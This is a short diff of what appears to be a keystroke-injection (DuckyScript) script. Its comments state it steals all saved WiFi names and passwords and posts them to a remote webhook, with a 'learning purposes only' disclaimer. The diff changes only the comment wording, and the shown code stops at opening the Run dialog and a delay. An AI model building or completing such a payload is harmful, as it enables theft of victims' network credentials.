@@ -1,4 +1,4 @@
-REM This is the code for stealing all registered WiFi names and Passworeds and posting them remotly to WebHook
+REM This code is for stealing all registered WiFi names and Passworeds and posting them remotly to WebHook
 REM This Code is only for Learning Purposes  and I'm Not responsible for any illegal uses 
 GUI r
 DELAY 300
